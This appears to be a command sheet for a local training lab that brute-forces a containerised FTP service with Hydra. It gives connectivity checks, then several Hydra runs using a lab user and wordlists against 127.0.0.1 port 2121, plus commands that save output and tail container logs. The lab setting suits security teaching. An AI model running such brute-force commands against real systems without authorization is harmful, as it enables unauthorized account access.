# Hydra 03 FTP - Commands

## Target validation

```bash
nc -zv 127.0.0.1 2121
```

Optional interactive check:

```bash
ftp -p 127.0.0.1 2121
```

## Hydra quick run

Host port **2121** maps to FTP port 21 inside the container (avoids host port conflicts).

```bash
hydra -l labuser -P words-quick.txt -s 2121 ftp://127.0.0.1
```

## Hydra demo run (longer list)

```bash
hydra -l labuser -P words-demo.txt -s 2121 -t 4 -V ftp://127.0.0.1
```

## Controlled run for cleaner logs

```bash
hydra -l labuser -P words-demo.txt -s 2121 -t 1 -W 2 -V ftp://127.0.0.1
```

## Save output artifact

```bash
hydra -l labuser -P words-demo.txt -s 2121 -t 1 -V -o artifacts/hydra-ftp.txt ftp://127.0.0.1
```

## Optional: container log tail

```bash
docker logs -f hydra-ftp-target
```
